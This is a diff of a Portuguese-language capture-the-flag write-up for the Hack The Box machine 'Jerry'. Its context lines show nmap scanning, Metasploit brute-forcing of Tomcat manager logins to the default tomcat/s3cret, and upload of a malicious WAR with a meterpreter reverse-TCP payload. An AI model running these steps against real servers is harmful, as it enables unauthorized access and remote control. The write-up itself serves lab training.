@@ -9,7 +9,7 @@ Jerry é uma máquina windows nada díficil.
 
 ![](https://raw.githubusercontent.com/brerodrigues/brerodrigues.github.io/master/assets/img/jerry_htb.jpg)
 
-Um scan do nmap padrão me fez verificar se estava mesmo conectado a vpn e se tinha algo errado com minha conexão.
+Um scan do nmap padrão me fez desconfiar se estava mesmo conectado a vpn ou se tinha algo errado com minha conexão.
 
 ```
 └──╼ $nmap -v -A  10.10.10.95 -oN nmap.txt
@@ -34,7 +34,7 @@ Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
 Nmap done: 1 IP address (0 hosts up) scanned in 3.63 seconds
 ```
 
-Mas, na verdade, o servidor estava só bloqueando Pings. Então, se usa -Pn.
+Mas, na verdade, o servidor estava bloqueando pings. Então usei -Pn.
 
 ```
 └──╼ $nmap -v -A  10.10.10.95 -Pn -oN nmap.txt
@@ -68,7 +68,7 @@ Description:
 ```
 
 Nada mágico, apenas se usará uma lista de usuario/senha e tentará logar no application manager.
-Setei os bagulhos do metasploit e botei o bicho para rodar enquanto pensava e pesquisava em outros meios de acesso.
+Setei os bagulhos do metasploit e botei o bicho para rodar enquanto pensava e pesquisava por outros meios de acesso.
 
 ```
 msf auxiliary(scanner/http/tomcat_mgr_login) > set RHOST 10.10.10.95
@@ -100,7 +100,7 @@ Eu realmente não acreditava que isso ia dar em algum lugar. Eles me ensinaram q
 ```
 
 Mas olhe só... O usuário tomcat usa a senha secreta s3cret. Agora sim temos algo útil.
-Ao acessar o manager, temos as aplicações que estão rodando no servidor e temos o poder de dar deploy em um arquivo war nosso, em outras palavras: execução de código que com certeza será malicioso. Se você não sabe, deveria pesquisar sobre o que é um deploy em um servidor tomcat, como o java faz as coisas e os carais. Não seja um kiddie que vai setar as coisas no metasploit e sair rodando. Que seja. Foda-se. Na verdade, um kiddie não faria ideia do que fazer ao ver uma página como essa onde não dá pra upar seu c99.php. C99... Estou velho. Seja um kiddie, seja feliz. Vote 666 e desbloqueie o Enéas na urna eletrônica.
+Ao acessar o manager temos as aplicações que estão rodando no servidor e temos o poder de dar deploy em um arquivo war nosso. Em outras palavras: execução de código que com certeza será malicioso. Se você não sabe, deveria pesquisar sobre o que é um deploy em um servidor tomcat, como o java faz as coisas e os carais. Não seja um kiddie que vai setar as coisas no metasploit e sair rodando. Que seja. Foda-se. Na verdade, um kiddie não faria ideia do que fazer ao ver uma página como essa onde não dá pra upar seu c99.php. C99... Estou velho. Seja um kiddie, seja feliz. Vote 666 e desbloqueie o Enéas na urna eletrônica.
 
 Agora sim essa máquina ficou fácil pra carai. E o metasploit, convenientemente, tem um outro módulo para fazer upload e executar um war maliciosissimo em um server que se tenha o usuário e senha: [https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload)
 
@@ -115,7 +115,7 @@ msf exploit(multi/http/tomcat_mgr_upload) > set RPORT 8080
 RPORT => 8080
 ```
 
-E sem esquecer do payload:
+Sem esquecer do payload:
 
 ```
 msf exploit(multi/http/tomcat_mgr_upload) > set PAYLOAD windows/meterpreter_reverse_tcp
@@ -137,7 +137,7 @@ msf exploit(multi/http/tomcat_mgr_upload) > exploit
 
 Que coisa linda, rapaz.
 
-E, sem dificuldade, dentro da pasta C:\Users\Administrator\Desktop\flags> há o arquivo
+Sem dificuldade, dentro da pasta C:\Users\Administrator\Desktop\flags> há o arquivo '2 for the price of 1.txt'
 
 ```
 C:\Users\Administrator\Desktop\flags>dir
